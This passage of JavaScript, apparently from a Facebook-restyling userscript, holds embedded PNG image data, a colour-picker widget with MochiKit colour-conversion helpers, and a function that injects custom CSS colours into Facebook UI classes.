     "LwHxAkOsd%2Bx8awJoeRGX3sVeA0%2BY9iINFYNIudnv%2BDqY8uZHjRjSRY6yAiT5xAyCBScyEKn6iamP67pneEbjgLIACk%2F%"+
     "2BWRidxKYOdx1uJV1JFpl6SaMTuhdF%2BNKlCxqCDSDGxi0g%2BdGVhygzgkRZFsTmoR4iMK0YcukhwhCkpo4wyxpylnqI8RCMaW"+
     "8JgEQP2QYgOTNFQGbsqeFRx5c7kjVjyMxD2MBLSEuXgFgBo9HJpWQNuCr9LAMSGeIkqzhTn5n5TMAil9iikRf7iwyRlDX5WZlIlg"+
     "PCe0gYLs5MfSpZMow3HtI4UYgTGx3o0uz3BOYSkOpjL4rr5lO%2BqB9oynpeAzo4TBCod5QXGYIeYpcMuZSsIVwsUiNfVQGERo6j"+
     "lSBNtu4CogI2yVOWE1IBM1MCA8qSIfIV8%2BaBeYI6Xxlt%2B6aHIMyy5KdpstXcAjOGRIvXEPw6ICkYT3MVXpEsxxDt5uIh1M2j"+
     "jUN3%2F3UP4ZR1W7JKU%2FyQubKHlHY0S4D0ydZPAQJcG%2FcdD%2BEzDjH1Psui3Y8kR23H1x0XrqFgFTmcJXjumDqKcCLH3vI8"+
     "XioTU%2B9%2FGAr1kOEkF4D0zDXvGAsPqXPJsi5xgyGzdDUHJDkKT3ZlqnvPQyZNvZA4maYuvKnjRgjwFbeSFSCYlD7EGW1e7AxP"+
     "lKwq3oHBCb0aKSv5TGXORGAwib1WwOrEYSqqeEc%2FMQx8qSJgzfBpyBhGjnS8m2riHBCXkiYB14rU0swZgImpm5TF6Qq032Eibb"+
     "b46CEbQZemvXyTQzL3bTiL6%2B3IXvJcdLL4LmepJl4AMurisaMNILqgYXkB7d7FpCwnWVVYVB1PhofkzOXs2%2FUQcpT2rHQbED"+
     "82gi%2FF3trjgHgIwilJuznoVUCGWNVx%2B2hMUAveWA9RycqmPou2whdiSOBNKoYKiPUQTWJq8jXWRO0hqBceErzE9fZx7xbepD"+
     "Q6QHQyFZ1BoNNo20teconUP1BkwK67fvClsSebuWQvnWVdx97kEp0TKmjqHSH2HlafPYSBKAECvqrm6nVA1C0oEsfJVJhTTcycn8"+
     "2ewhZPTZ2WFcICmMWOrtOWv3rjRwrFq5Qlo5MwSMH4TimLOOH4YgGJo8IQbaGDwBsespSsYOrMEK2CKU9BZEmvZv4ikdbwJcVezH"+
     "oICRjkdIR7iJo69XeNxNRKen%2B%2FA0h6ROHxrlGoUau4Rc9QTqDv7Ro8BAjjRJIla9%2B4frQGk9%2Fouc7Uu0hZD6FRI5u6gS"+
     "fVxBUgqXdrJw%2FW7iBI4tQlLwsZD0L00dEqSHhC1yjRxvkOLK2J4dFNi%2BGYZek4EYEx3kOGqaMYc5fJ1jhNpIFjeRWQkKeQrT"+
     "p7SElGzhwA%2BcJUsjhX0fIi1DzA7%2F4yfzSkqhR7aYDS4aEgMBhkJlvJ3A9mKDzt%2Bz1AcsCFMWyxeuczAwIrWeFZJf%2FXly"+
     "4%2FI8OURUpj77bgS82xNxXCzhBoCB5jyQo6rjKmHuFhAXvDC4CYPIUyNfWw73sKIskKyamkxTYMkcVG2O%2FFiJSJvQwa23ac9t"+
     "IIUTkRhosMjzP1G4C8iYAZQAqKBSTEXhgI2MZz6YO37ThApJ8aRiB387TY0Eg7T1kyOtmycAV4OOiyhwyRiqZOM2AC5K2%2FgoHY"+
     "IiApVyGKVYi9tyEQi3%2Fhv8gFXHKiIHQMzHmzhXer574N3RwqZJU6y8ZAGg8ZKavG2S8PUjog7VN2D0QGJHMj%2Fix5CIGlklV1"+
     "ssXjkf7dL325DYGK0%2BQ5PDqhTt4ZEYthcJY%2BSMk1kb6fKWucjmAA0wPyBSDT7GQAWXsIFpJFr6HrPFonATvnu6nYXS29g4lG"+
     "J2GU0riQw29d8KVSQObvPfbidUAiENxD%2BGdYQyABN0tWNHVT%2FoBJBQyLjrzYroe42Eu7vYgMRbhsygoheKOsJd97V6GaiDFC"+
     "6RbvAAnMcI0j8aRfOw9hyRLoKo0N%2B3WYTGn%2B8eauvFEIjKmzbQfh01Asw0X%2BTjZeEYbxPWsVEqkegmNv%2F0lA5m7Bpn5h"+
     "0%2BeSCUxjoptMHXFwCA6zmKUsYUh4hROwipyvQg8JoFFvp9LIZl4nKes%2BIJyd7rkFR%2BIsUiJ5%2BkzzX5SsXBbZ4ldB1zPE"+
     "glYJtCK7naWoSxeH38CPYOoJmNBDksUzMBNAQtCNsRfZZyhXWXiMZHWJmkIQxAlmmac27k09eogCDDpTH%2FDwQVXiy8bwBgFrAF"+
     "Hs5cHjsPbbgMjejvadx%2BdlCY9IVoI2Li%2BQBiDIzmJTVmzquOEhkqt41JjTVoSA4AsCxrG3AUIWfwkIwik4XHZCkB4RqakYBc"+
     "maPGqHJQhng0Hkkj%2BklFaDS2S%2BVHmHmnrIeIeKUBODkG0iYN1ZvMUjjVUsIDElqX3nlKUewuPymWSFJQMyBBB9l8UGnHELp5"+
     "yAFdnfJTFE7kKhQQqBJTJHN9NR5uIYMCDoI3qSMTtWmQIikoPp0murMB4Slgq7kSwFQpbQiZW%2Fqk6y3HPSKyKI1YHXH60iZJVe"+
     "YQYpWhfV4um4aglICrx8cpHkjLKXW2AWDitZ4%2FWDVZqZIHsZab%2Fn55TJVeTUptCjEgeGHBUBZssDFXNV2Wfkasstvvf2eh%2"+
     "BQEHsnz%2FSArK96KMiSld3CsijudywYsq34Iq%2BpKfDSvMsCUpFOR2iZt9Dmq%2FxsDFI6ICxAziHQQ6dbXqDOPMRcmVQVfGLB"+
     "kIksAfVKnLJtJ4bUCXg1sapOr4a%2FUMoKV3KIpZOt57MmgDAnkEyZlxPRJ1zAnTAEwhXPiX5FDeZKpJDEqSxAqwHgKUNUwDQEE0"+
     "%2FGZ8pABcM1BgT1BUAST2zADUs92%2F36XPUMl6hiZirJERJfbjNkLHIN77u5qxB%2F5fwwh2BoEqv2qgvZPUC8cA1ZCjyZLLrP"+
     "T31%2FJ0aILFlHgKh%2BWUTj8YwIzJZBMw6zCcwhDPPjebIFGaEIPKmrnP%2B%2FrOeAxEW3i9zdIk%2Bvwu6n2GvZw0e4srCpVc"+
     "AuL%2Ba5ysVemJQ1Z0gCgvmQenuYbMXYO%2BBhAUst3gGSxiIX4gRZwAUEQXjQfwHo6YbvGjH2hiQ1bRwBmDp5TmKIPEeAGWMX10"+
     "pQffZieNhRgoBdAaJHSxNxwpIFQZRIhtCNWo1bMpNOcsnb3KJ7sNbPya%2BpSaxSU0923iAkww%2BxN9VE6ygMiFnsYe7SQ%2BZ%"+
     "2BEV0jccGZ93ynx708sfE4OqHsFERqHgPC%2BwlDDG9qkLUaLZ6ZYlrJKV1rQOKBat%2Bf1EPULUpYRhAL1GeqPj9kJBqxkywRQ2"+
     "K68sbt3WIuZBRPiTFRrGIYJp%2FJ0FS4fLYhHPNSNH4VEFrQMCoU%2BdBHww0LKe6W8GgJ4mICrnUEXEnW9NGaPKQmAav0DtU8ug"+
     "k8mwC8hRwW%2BfKzgHj7pkcjJyYCJu%2FDzpSTFOJ%2BD1A6hpQpQyq9zwuSJcvb9r%2FnCzf1OMv6GUC8P4h9a3935pwhCM%2Fg"+
     "XR%2B9g0Uqs0dgwlqysqkb2w4MkddsFq5s3MwGfafNRuNKUDT2fQmQiZFba5cix5IVe0eyfiNSyeI9BGVi%2BDU%2FGmUtMySejk"+
     "DnXbrkKlJRutTGvwLIDJYlXJSrUoRl66Te0bKblRy%2FvAy4hWcmZwkCXk7iD8vb8X8ZmGrkC9m3DhnH1zJyVRw8rgGpYtjaH9zS"+
     "dw%2BZ2TjD4ziwBGJu9cvn0NJvM9DuMERgYz8gyZLFF1DjeCVPhAXQBEhoHgYQyVM5V808ZLK%2FI3NWIlWDPMYFnRg2lgOVvhwT"+
     "hggXzIRrkqvkp4k3DpBKn7prnoqAVMpRDhBn2VMPyeNDF3hnPSQsOrCQLPsKXbKbpo7cSqp5xZYFbAHIYM8ApP2%2BcVgyaxUce5"+
     "2dLzmRJEtMvKQ8hMnux5IFU0CmLHIMkSUPMDm%2BVB1HtldQTI5tvmJm%2BAUWEOVL36UTLvTlnHAiP1ZMDCYQ%2B%2FJiutjxfa"+
     "xkWS9ipT%2B%2FGpN3bJpKVlvuIHlVXCc4ypcBkaVCWA51GN3DtpOnRYbs4iGTJfFnvryToBzMt8iuz5%2BxpXeXO1IExCBZKVdF"+
     "L%2FFXXwAkSU8%2B99PjprB3kZNTPgMnN3JOIn7jOOEYcgvCqWS5lGVZVBEmwdFDgtWbYcsVIBcQ6MHS5BUqP2WekTQCpCvynZUj"+
     "mOwW4alTIVsxJJm6il56TjVSR7KmFi9s0XhwDxDNNuoWxtSTh9jntKswYl91jOV%2BX10FIQtLt2BIMvkNYV4cXhG7iDSWnwAkSA"+
     "1SOoJReV78EvZgMT6jn%2B0zmHOUqUh5OTOPboFhKj2TlCWuUWnJyUPC95C5QhJbAxKXWReyLZI19ZHEdCdHt6he1hY9JHHMJykD"+
     "gQFEdn2JJTByIrLJSpaM5uN8WGqf5i1z5QHJUEAtWkeC2RHcWGS6vxH%2ByY4%2FvFQwC3pTsgKEM4ZkiRJTj5LlPSQGZZ0IB3iU"+
     "UwX7zC8iIJ4FszZepZ1Uy7T2bjC7FzeWF9cMib4wedeZjRdKUkay7LtnYNZ8qQK6ByRGWpOZ4PxBFhthJ2O6nLww8wVd7fcFIAtg"+
     "K%2F8GhhP8G9QocxY0qYn9J8qXBM8fAEgWucnCIcXL%2Fg70GRGCi6WfcGr9Ci84kSFh0rWSLMOpal5BQFq%2BbOEVCkgsdjN%2F"+
     "cLI2ax5h78IsByaydGO%2Fzxly4SFxC2zmUzo8WbLS7q8ibtv4nhiWABFgrgCJ%2FjBEKT03yVFOYFOrV6DjgtqUdYchlzBtE8mK"+
     "i60iExc7OhSJFL3bRMCuAammhdOUiZ4dihw%2FJ1bA0VHoOSUJhoM9LGTmRAe8msWty%2FeR4eKoiTmRyb%2BsujCc5Kwm2K2A%2"+
     "FQGAZJ8YXAj%2FcKR%2FuPsHw%2B3pBLdCuVreKYRZlGQHx0%2FZougZgDf5lE16zNcBMXaedZwXGwhWTf%2FU1DzCMuRFji7kIS"+
     "gvQlDNZ08Eh5YpL52RLEpSyUMCMGsBI0fp%2F0IDiLZou9gj6WQPMa4xRi8ukbkl1PdbmLoH5MVXyGKHn9bE3JTEQl8PsCdxq1Ow"+
     "VoDw3rWADMBMKnJmaWAq7C2TpStmsdMr%2BJNdnpqAtk0ZkgNukCXnISmXScoaImWCwxyQlIRwseRi6uGfhrRbYfZw3gQr%2B%2F"+
     "0yQ%2BxyFvuZji9ZsiSJGQirelQCRA6EMyDnglr3oPzjl3f4TPqnuv0dmTV5hyk8Nxly%2BWganUz5UtOj29zw8wiFYwD7VIDuCh"+
     "AvVixHdtFhrBTTBQT%2FU70cmSZzExBn6twb9N%2ByZNOMBVOpuhapnwLEdQzNZQvQ9F3M%2FuTm4eVI392NRebsGScXE0DDZxpx"+
     "CkmK42vYRPqcGrObAhLeZQGIvaLFAeICZnsE%2FDIgMEKflXzH7P5y4zmJIfPnjMwzh9TyOHgItxLimOPEFSA8LJk5ghY4ywLYfz"+
     "gwFxxcLtZU9G4udvzMapnrXrNNN0E1n1nN7%2Bzic2ZWlU29ACQ17SAbKl3CE%2FOPwFRiUjFcu4W%2Bw1yy0m87vQrvVxfvUO07"+
     "1MTKuoTQXHlAomAkQHRXcLSVX38WYctCMKygTQw%2F7c%2FLq0sP0d5tnktBQCCsZoNs4TepKBMIavpNPCCL%2FY74i1pZmnFKX1"+
     "lWnJjsd7wOCOt5ZsSUcVt2IW4l5nfeAoTyPlYILwGxIXaykHEPzpYD%2Bk8KjIiwLMXlCjSz2PrZc4bMF2niDGkT1LQJKupL8DAg"+
     "a06kfzjSHhSfMAsHzPaw8a2LhUwwGU6sN0HgsXbzCcfc8tbF6x0r6xKem4AUR%2BwkXeH1brfyabzbn3a%2FOyBeYMjkFZsP3hPw"+
     "6vIz6xRuM0N%2BHZBq8xD8viSmuL3nd3venyXvyLyQ1wK04ML6OSkz3fitN%2Ff7xKbueogMZOpLgMgvDk9l5yjhF0UOkDOG0Fh%"+
     "2FKk5u0S8B9UJG9%2FZefWa0evt71cXvVW3drMnB96lrTPdy2jnR1L2YZJGzUpiXF64T3GdI%2BozqXeySldtKGLOpO%2BmSz6jm"+
     "MxiQOC2a7r2JxHjNn0FIMeDGgvr97hfQc2qyow1HnUXP3yGIXZm7RljLzfarO4AYouPGcgAzu10xBLcW%2B4pTC9eZpazLd0%2Bg"+
     "Xb77WghfBOR6cTD5RevckSavmOr7LL3deoVjZZ28Yrb73Tbabr6iLn6vOv0MBcRF28VCzrOXlx%2BsesilNCz3%2B5wh812%2FkC"+
     "z%2FfvX2%2B20LYIOjJF2Kqr%2B7Rb%2Fee2Vu0JfLac9Q7nnIHUBWzkRBpeJLkOZes%2BRxvfh3ZUAmi35p0Qzh1eIkBb%2B3vL"+
     "jHosk%2FdVt8xtc3wfbCv3O78Rk3AUkWfb0cJgrPc1l9cfd%2FgSHL55QLaU7StV%2F%2Bzuk51T4nb3wfVJc0vQfhffJjCWm9gv"+
     "Q%2BINMWMdX3tW%2B9zsobSvQFQBSWV15x21IX%2Fwy8%2BIrt1r%2FkugndcUcF4pVXXANywwonfLncVcvl2F%2BC9GsMgTuzfP"+
     "kzzQ7f7nzmhfasAfmafNzh1LWl%2FtcAcuP9tj%2Fit7y50e4D8kLKenU5v7a8WH5KfQnCL24CvJYm%2F1mA%2FAEfewnIfz9Dvg"+
     "bI%2FrNr%2BccA8pOc%2Bqd85j8DkP2f%2F1v%2Bf2jmJBw1Fe8SAAAAAElFTkSuQmCC";
     
  // Here are some boring utility functions. The real code comes later.
  function hexToRgb(hex_string, default_){
    if (default_ == undefined)
        default_ = null;
    if (hex_string.substr(0, 1) == '#')
        hex_string = hex_string.substr(1);
    var r;
    var g;
    var b;
    if (hex_string.length == 3) {
      r = hex_string.substr(0, 1);
      r += r;
      g = hex_string.substr(1, 1);
      g += g;
      b = hex_string.substr(2, 1);
      b += b;
    } else if (hex_string.length == 6) {
      r = hex_string.substr(0, 2);
      g = hex_string.substr(2, 2);
      b = hex_string.substr(4, 2);
    } else {
      return default_;
    }
    r = parseInt(r, 16);
    g = parseInt(g, 16);
    b = parseInt(b, 16);
    if (isNaN(r) || isNaN(g) || isNaN(b))
      return default_;
    else
      return {r: r / 255, g: g / 255, b: b / 255};
  }
  
  function rgbToHex(r, g, b, includeHash) {
    r = Math.round(r * 255);
    g = Math.round(g * 255);
    b = Math.round(b * 255);
    if (includeHash == undefined)
      includeHash = true;
    r = r.toString(16);
    if (r.length == 1)
      r = '0' + r;
    g = g.toString(16);
    if (g.length == 1)
      g = '0' + g;
    b = b.toString(16);
    if (b.length == 1)
      b = '0' + b;
    return ((includeHash ? '#' : '') + r + g + b).toUpperCase();
  }
  
  var arVersion = navigator.appVersion.split("MSIE");
  var version = parseFloat(arVersion[1]);
  
  function fixPNG(myImage) {
    if ((version >= 5.5) && (version < 7) && (document.body.filters)) {
      var node = document.createElement('span');
      node.id = myImage.id;
      node.className = myImage.className;
      node.title = myImage.title;
      node.style.cssText = myImage.style.cssText;
      node.style.setAttribute('filter', "progid:DXImageTransform.Microsoft.AlphaImageLoader" + "(src=\'" + myImage.src + "\', sizingMethod='scale')");
      node.style.fontSize = '0';
      node.style.width = myImage.width.toString() + 'px';
      node.style.height = myImage.height.toString() + 'px';
      node.style.display = 'inline-block';
      return node;
    } else {
      return myImage.cloneNode(false);
    }
  }
  
  function trackDrag(node, handler) {
    function fixCoords(x, y) {
      var nodePageCoords = pageCoords(node);
      x = (x - nodePageCoords.x) + document.documentElement.scrollLeft;
      y = (y - nodePageCoords.y) + document.documentElement.scrollTop;
      if (x < 0) x = 0;
      if (y < 0) y = 0;
      if (x > node.offsetWidth - 1) x = node.offsetWidth - 1;
      if (y > node.offsetHeight - 1) y = node.offsetHeight - 1;
      return {x: x, y: y};
    }
    function mouseDown(ev) {
      var coords = fixCoords(ev.clientX, ev.clientY);
      var lastX = coords.x;
      var lastY = coords.y;
      handler(coords.x, coords.y);
      function moveHandler(ev) {
        var coords = fixCoords(ev.clientX, ev.clientY);
        if (coords.x != lastX || coords.y != lastY) {
          lastX = coords.x;
          lastY = coords.y;
          handler(coords.x, coords.y);
        }
      }
      function upHandler(ev) {
        myRemoveEventListener(document, 'mouseup', upHandler);
        myRemoveEventListener(document, 'mousemove', moveHandler);
        myAddEventListener(node, 'mousedown', mouseDown);
      }
      myAddEventListener(document, 'mouseup', upHandler);
      myAddEventListener(document, 'mousemove', moveHandler);
      myRemoveEventListener(node, 'mousedown', mouseDown);
      if (ev.preventDefault) ev.preventDefault();
    }
    myAddEventListener(node, 'mousedown', mouseDown);
    //node.onmousedown = function(e) { return false; };
    //node.onselectstart = function(e) { return false; };
    //node.ondragstart = function(e) { return false; };
  }
  
  var eventListeners = [];
  
  function findEventListener(node, event, handler) {
    var i;
    for (i in eventListeners)
      if (eventListeners[i].node == node && eventListeners[i].event == event && eventListeners[i].handler == handler)
        return i;
    return null;
  }
  
  function myAddEventListener(node, event, handler) {
    if (findEventListener(node, event, handler) != null)
      return;
    if (!node.addEventListener)
      node.attachEvent('on' + event, handler);
    else
      node.addEventListener(event, handler, false);
    eventListeners.push({node: node, event: event, handler: handler});
  }
  
  function removeEventListenerIndex(index) {
    var eventListener = eventListeners[index];
    delete eventListeners[index];
    if (!eventListener.node.removeEventListener)
      eventListener.node.detachEvent('on' + eventListener.event, eventListener.handler);
    else
      eventListener.node.removeEventListener(eventListener.event, eventListener.handler, false);
  }
  
  function myRemoveEventListener(node, event, handler) {
    removeEventListenerIndex(findEventListener(node, event, handler));
  }
  function cleanupEventListeners() {
    var i;
    for (i = eventListeners.length; i > 0; i--)
      if (eventListeners[i] != undefined)
        removeEventListenerIndex(i);
  }
  
  myAddEventListener(window, 'unload', cleanupEventListeners);
  
  // This copyright statement applies to the following two functions,
  // which are taken from MochiKit.
  //
  // Copyright 2005 Bob Ippolito <bob@redivi.com>
  //
  // Permission is hereby granted, free of charge, to any person obtaining
  // a copy of this software and associated documentation files (the
  // \"Software\"), to deal in the Software without restriction, including
  // without limitation the rights to use, copy, modify, merge, publish,
  // distribute, sublicense, and/or sell copies of the Software, and to
  // permit persons to whom the Software is furnished to do so, subject
  // to the following conditions:
  //
  // The above copyright notice and this permission notice shall be
  // included in all copies or substantial portions of the Software.
  // 
  // THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,
  // EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
  // MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
  // NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS
  // BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
  // ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
  // CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
  
  function hsvToRgb(hue, saturation, value) {
    var red;
    var green;
    var blue;
    if (value == 0.0) {
      red = 0;
      green = 0;
      blue = 0;
    } else {
      var i = Math.floor(hue * 6);
      var f = (hue * 6) - i;
      var p = value * (1 - saturation);
      var q = value * (1 - (saturation * f));
      var t = value * (1 - (saturation * (1 - f)));
      switch (i) {
        case 1: red = q; green = value; blue = p; break;
        case 2: red = p; green = value; blue = t; break;
        case 3: red = p; green = q; blue = value; break;
        case 4: red = t; green = p; blue = value; break;
        case 5: red = value; green = p; blue = q; break;
        case 6: // fall through
        case 0: red = value; green = t; blue = p; break;
      }
    }
    return {r: red, g: green, b: blue};
  }
  
  function rgbToHsv(red, green, blue) {
    var max = Math.max(Math.max(red, green), blue);
    var min = Math.min(Math.min(red, green), blue);
    var hue;
    var saturation;
    var value = max;
    if (min == max) {
      hue = 0;
      saturation = 0;
    } else {
      var delta = (max - min);
      saturation = delta / max;
      if (red == max)
        hue = (green - blue) / delta;
      else if (green == max)
        hue = 2 + ((blue - red) / delta);
      else
        hue = 4 + ((red - green) / delta);
      hue /= 6;
      if (hue < 0) hue += 1;
      if (hue > 1) hue -= 1;
    }
    return {
      h: hue,
      s: saturation,
      v: value
    };
  }
  function pageCoords(node) {
    var x = node.offsetLeft;
    var y = node.offsetTop;
    var parent = node.offsetParent;
    while (parent != null) {
      x += parent.offsetLeft;
      y += parent.offsetTop;
      parent = parent.offsetParent;
    }
    return {x: x, y: y};
  }
  
  // The real code begins here.
  var huePositionImg = document.createElement('img');
  huePositionImg.galleryImg = false;
  huePositionImg.width = 35;
  huePositionImg.height = 11;
  huePositionImg.src = HUE_SLIDER_ARROWS_LOCATION;
  huePositionImg.style.position = 'absolute';
  var hueSelectorImg = document.createElement('img');
  hueSelectorImg.galleryImg = false;
  hueSelectorImg.width = 35;
  hueSelectorImg.height = 200;
  hueSelectorImg.src = HUE_SLIDER_LOCATION;
  hueSelectorImg.style.display = 'block';
  var satValImg = document.createElement('img');
  satValImg.galleryImg = false;
  satValImg.width = 200;
  satValImg.height = 200;
  satValImg.src = SAT_VAL_SQUARE_LOCATION;
  satValImg.style.display = 'block';
  var crossHairsImg = document.createElement('img');
  crossHairsImg.galleryImg = false;
  crossHairsImg.width = 21;
  crossHairsImg.height = 21;
  crossHairsImg.src = CROSSHAIRS_LOCATION;
  crossHairsImg.style.position = 'absolute';
  
  function makeColorSelector(inputBox) {
    var rgb, hsv
    function colorChanged() {
      var hex = rgbToHex(rgb.r, rgb.g, rgb.b);
      var hueRgb = hsvToRgb(hsv.h, 1, 1);
      var hueHex = rgbToHex(hueRgb.r, hueRgb.g, hueRgb.b);
      previewDiv.style.background = hex;
      inputBox.value = hex;
      satValDiv.style.background = hueHex;
      crossHairs.style.left = ((hsv.v*199)-10).toString() + 'px';
      crossHairs.style.top = (((1-hsv.s)*199)-10).toString() + 'px';
      huePos.style.top = ((hsv.h*199)-5).toString() + 'px';
    }
    function rgbChanged() {
      hsv = rgbToHsv(rgb.r, rgb.g, rgb.b);
      colorChanged();
    }
    function hsvChanged() {
      rgb = hsvToRgb(hsv.h, hsv.s, hsv.v);
      colorChanged();
    }
    var colorSelectorDiv = document.createElement('div');
    colorSelectorDiv.style.padding = '15px';
    colorSelectorDiv.style.position = 'relative';
    colorSelectorDiv.style.height = '275px';
    colorSelectorDiv.style.width = '250px';
    var satValDiv = document.createElement('div');
    satValDiv.style.position = 'relative';
    satValDiv.style.width = '200px';
    satValDiv.style.height = '200px';
    var newSatValImg = fixPNG(satValImg);
    satValDiv.appendChild(newSatValImg);
    var crossHairs = crossHairsImg.cloneNode(false);
    satValDiv.appendChild(crossHairs);
    function satValDragged(x, y) {
      hsv.s = 1-(y/199);
      hsv.v = (x/199);
      hsvChanged();
    }
    trackDrag(satValDiv, satValDragged)
    colorSelectorDiv.appendChild(satValDiv);
    var hueDiv = document.createElement('div');
    hueDiv.style.position = 'absolute';
    hueDiv.style.left = '230px';
    hueDiv.style.top = '15px';
    hueDiv.style.width = '35px';
    hueDiv.style.height = '200px';
    var huePos = fixPNG(huePositionImg);
    hueDiv.appendChild(hueSelectorImg.cloneNode(false));
    hueDiv.appendChild(huePos);
    function hueDragged(x, y) {
      hsv.h = y/199;
      hsvChanged();
    }
    trackDrag(hueDiv, hueDragged);
    colorSelectorDiv.appendChild(hueDiv);
    var previewDiv = document.createElement('div');
    previewDiv.style.height = '50px'
    previewDiv.style.width = '50px';
    previewDiv.style.position = 'absolute';
    previewDiv.style.top = '225px';
    previewDiv.style.left = '15px';
    previewDiv.style.border = '1px solid black';
    colorSelectorDiv.appendChild(previewDiv);
    function inputBoxChanged() {
      rgb = hexToRgb(inputBox.value, {r: 0, g: 0, b: 0});
      rgbChanged();
    }
    myAddEventListener(inputBox, 'change', inputBoxChanged);
    inputBox.size = 8;
    inputBox.style.position = 'absolute';
    inputBox.style.right = '15px';
    inputBox.style.top = (225 + (25 - (inputBox.offsetHeight/2))).toString() + 'px';
    colorSelectorDiv.appendChild(inputBox);
    inputBoxChanged();
    return colorSelectorDiv;
  }
  /** End of code that's not written by me. **/

  (node=document.getElementById("colour1").getElementsByTagName("input")[0]).parentNode.insertBefore(makeColorSelector(node), null);
  (node=document.getElementById("colour2").getElementsByTagName("input")[0]).parentNode.insertBefore(makeColorSelector(node), null);
}

function addStyle(setup) {
  if (!setup.colour1 && !setup.colour2)
    setup = eval('({colour1:"#3b5998", colour2:"#6d84b4"})');

  style = document.getElementsByTagName('head')[0].appendChild(document.createElement('style'));
  style.type = 'text/css';
  style.innerHTML = ".groupProfileHeader .fsxl {" +
                  "    color: #1C2A47;" +
                  "}" +
                  ".groups_highlight_box {" +
                  "    color: #535353;" +
                  "}" +
                  ".uiComposer .attachmentFrame {" +
                  "    border-color: #B4BBCD #B4BBCD #CCCCCC;" +
                  "}" +
                  ".uiComposerHideMessageBox .attachmentFrame, .uiComposerHideInput .attachmentFrame {" +
                  "    border-bottom-color: #B4BBCD;" +
                  "}" +
                  ".uiComposerMessageBox {" +
                  "    border-color: #B4BBCD;" +
                  "    border-right: 1px solid #B4BBCD;" +
                  "}" +
                  ".uiComposerMessageBox .inputContainer {" +
                  "    border: 1px solid #B4BBCD;" +
                  "}" +
                  ".uiComposerMessageBox .composerTypeahead {" +
                  "    border-bottom: 1px solid #B4BBCD !important;" +
                  "    border-color: #B4BBCD !important;" +
                  "}" +
                  ".uiComposerMessageBox .composerTypeahead .wrap {" +
                  "    border-color: #B4BBCD !important;" +
                  "}" +
                  ".uiMentionsInput .highlighter b {" +
                  "    background: none repeat scroll 0 0 #D8DFEA;" +
                  "}" +
                  ".uiToken {" +
                  "    background: none repeat scroll 0 0 #E2E6F0;" +
                  "    border: 1px solid #9DACCC;" +
                  "    color: #1C2A47;" +
                  "}" +
                  ".uiTokenSelected {" +
                  "    background-color: "+setup.colour2+";" +
                  "    border-color: "+setup.colour1+";" +
                  "}" +
                  ".uiInlineTokenizer {" +
                  "    border: 1px solid #BDC7D8;" +
                  "}" +
                  ".interaction_form .underline {" +
                  "    border-bottom: 1px solid #EDEFF5;" +
                  "}" +
                  ".interaction_form .link_placeholder {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".giftshop .extra_text strong {" +
                  "    color: #008000;" +
                  "}" +
                  "#embedded_store #giftshop_search_option_input {" +
                  "    border: 1px solid #BDC7D8;" +
                  "}" +
                  "#embedded_store #store_footer {" +
                  "    border-top: 1px solid #D5D5DF;" +
                  "}" +
                  ".UIErrorForm_Field select {" +
                  "    border: 1px solid #BDC7D8;" +
                  "}" +
                  ".UIErrorForm_NoError {" +
                  "    border: 1px solid #BDC7D8;" +
                  "}" +
                  ".UIErrorForm_ErrorField {" +
                  "    border: 2px solid #DD3C10;" +
                  "}" +
                  ".UIErrorForm_Flag_Inner {" +
                  "    background-color: #FFEBE8;" +
                  "    border-bottom: 1px solid #EB8266;" +
                  "}" +
                  ".contextual_dialog .contextual_dialog_content {" +
                  "    border-color: #333333 #333333 #283E6A;" +
                  "}" +
                  ".UIHelpFlag_Close:hover {" +
                  "    background-color: #F9EFB3;" +
                  "}" +
                  ".UIHelpFlag_Block .UIHelpFlag_Inner {" +
                  "    background-color: #FFF9D7;" +
                  "    border-bottom: 1px solid #E2C822;" +
                  "}" +
                  ".UIErrorFlag .UIErrorFlag_Inner {" +
                  "    background-color: #FFEBE8;" +
                  "    border-bottom: 1px solid #EB8266;" +
                  "}" +
                  ".error_field {" +
                  "    background: none repeat scroll 0 0 #DD3C10;" +
                  "}" +
                  ".error_field input.inputtext, .error_field input.inputpassword, .error_field #captcha_response {" +
                  "    border-color: #DD3C10;" +
                  "}" +
                  "#ci_module_list li.ci_module:hover {" +
                  "    background-color: #EDEFF4;" +
                  "}" +
                  "#ci_module_list li.ci_module.expanded {" +
                  "    background-color: #EDEFF4;" +
                  "}" +
                  "#wizard_step #ci_module_list, #wizard_step #ci_module_list li.ci_module.expanded, #wizard_step #ci_module_list li.ci_module.expanded:hover {" +
                  "    background-color: #EDEDED;" +
                  "}" +
                  "#ci_module_list .ci_module {" +
                  "    border-color: #D8DFEA;" +
                  "}" +
                  ".autoimport .error {" +
                  "    background: none repeat scroll 0 50% #FFEBE8;" +
                  "    border: 1px solid #DD3C10;" +
                  "}" +
                  "#filter a:hover {" +
                  "    border-color: #D8DFEA;" +
                  "}" +
                  "#filter a.selected {" +
                  "    border-color: #D8DFEA #D8DFEA "+setup.colour1+";" +
                  "}" +
                  ".friendtable .info .updates {" +
                  "    background: none repeat scroll 0 0 #FFF8CC;" +
                  "    border-bottom: 1px solid #FFE222;" +
                  "}" +
                  ".friendtable .actions a, .friendtable .actions span {" +
                  "    border-bottom: 1px solid #D8DFEA;" +
                  "}" +
                  ".friendtable .actions a:hover {" +
                  "    background: none repeat scroll 0 0 "+setup.colour1+";" +
                  "}" +
                  ".confirmcount {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".confirm {" +
                  "    border: 1px solid #D8DFEA;" +
                  "}" +
                  ".public_listing .search_bar span.highlight {" +
                  "    background-color: #FFF8CC;" +
                  "}" +
                  "#public_listing_pages .category h3 {" +
                  "    border-bottom: 1px solid #D3DAE8;" +
                  "}" +
                  ".public_listing .logged_in_vertical_alert {" +
                  "    background: none repeat scroll 0 0 #FFF9D7;" +
                  "    border: 1px solid #E2C822;" +
                  "}" +
                  ".uiComboInput {" +
                  "    border: 1px solid #BDC7D8;" +
                  "}" +
                  ".fbEmu .body a.signature {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
